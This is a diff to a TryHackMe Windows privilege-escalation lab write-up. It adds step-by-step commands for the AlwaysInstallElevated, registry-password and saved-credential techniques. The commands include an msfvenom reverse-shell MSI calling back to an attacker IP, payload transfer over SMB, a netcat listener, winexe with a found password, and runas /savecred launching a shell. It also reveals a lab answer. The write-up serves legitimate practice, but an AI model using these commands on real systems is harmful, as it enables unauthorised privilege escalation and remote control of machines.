@@ -1,3 +1,5 @@
+![Windows PrivEsc Banner](https://i.imgur.com/2dmv1BY.png)
+
 <p align="center">
    <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Windows_Priv_Esc_Cover.png" alt="Windows PrivEsc Logo">
 </p>
@@ -296,39 +298,111 @@ nc -nlvp 1337
 
 ### Registry - AlwaysInstallElevated
 
+In this task we will utilize the fact that sometimes, programs will get installed using an elevated installer.
 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f msi -o reverse.msi
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+*Read and follow along with the above.*
 
-nc -nlvp 1337
+As before, we first query the registry related to this exploit to see if it is enabled (denoted by a 1).
 
-copy \\10.18.78.136\kali\reverse.msi "C:\PrivEsc\reverse.ms
+```cmd
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+```
 
-Read and follow along with the above.
+![Query Register](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Always_Install_Elevated_Query_Register.png)
+
+Now we must create a payload for us to send to the machine, which we can install to create a reverse shell with elevated priveleges. This we do with MSF Venom. This time, we make an msi file. Again, we must specify a port and our own ip address.
+
+```cmd
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f msi -o reverse.msi
+```
+
+![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Always_Install_Elevated_Reverse_Shell.png)
+
+Next, we can us the smb server from before to transfer our file to the machine. Or we can set up a new one.
+
+On our machine:
+
+```cmd
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+```
+
+On the target machine:
+
+```cmd
+copy \\10.18.78.136\kali\reverse.msi "C:\PrivEsc\reverse.ms
+```
+
+![Copy File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Always_Install_Elevated_Copy_File.png)
+
+The last step is to setup a listener on the specified port.
+
+```cmd
+nc -nlvp 1337
+```
+
+Al that is left to do now, is to execute the installer and wait for the connection to be made.
+
+```cmd
+msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+```
+
+![Reverse Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Always_Install_Elevated_Reverse_Connection.png)
+
 
 ### Passwords - Registry
 
-
-reg query /f password  /t REG_SZ
-reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
-winexe -U 'admin%password123' //10.10.6.194 cmd.exe
-
+In this task we will search the registry for any keys related to credentials. Unfortunately, as stated in the description, the password was not saved in the registry for me. So I had to use the supplied hint. However, I did perform all necessary steps that would have otherwise granted me the password.
 
 1. What was the admin password you found in the registry?
 
+   To search the registry for a specific keyword, we can use the following command:
    
+   ```cmd
+   reg query /f password  /t REG_SZ
+   ```
+   
+   ![Search Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Registry_Search_Registry.png)
+   
+   Since I couldn't find anything, I used the specific search string to directly query the necessary entry.
+   
+   ```cmd
+   reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+   ```
+   
+   ![Query Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Registry_Query_Register.png)
+   
+   Unfortunately, I couldn't find the password here. So I used the supplied hint to create a connection to the target machine from our machine.
+   
+   ```cmd
+   winexe -U 'admin%password123' //10.10.6.194 cmd.exe
+   ```
+   
+   ![Remote Shell Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Registry_Remote_Shell.png)   
 
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>password123</details>
 
 ### Passwords - Saved Creds
 
-cmdkey /list
-runas /savecred /user:admin C:\PrivEsc\reverse.exe
+In this task we will exploit the fact that credentials are saved on the machine itself.
 
-Read and follow along with the above.
+*Read and follow along with the above.*
+
+For this question we will use `cmdkey` to get more info on the stored credentials. To list all stored credentials we can use:
+
+```cmd
+cmdkey /list
+```
+
+![Saved Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Saved_Creds_Credentials.png)
+
+Now we can run the reverse as we did before. However, this time it will be executed running as a user with elevated priveleges.
+
+```cmd
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+```
+
+![Elevated Reverse Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Saved_Creds_Reverse_Connection.png)
 
 ### Passwords - Security Account Manager (SAM)
 
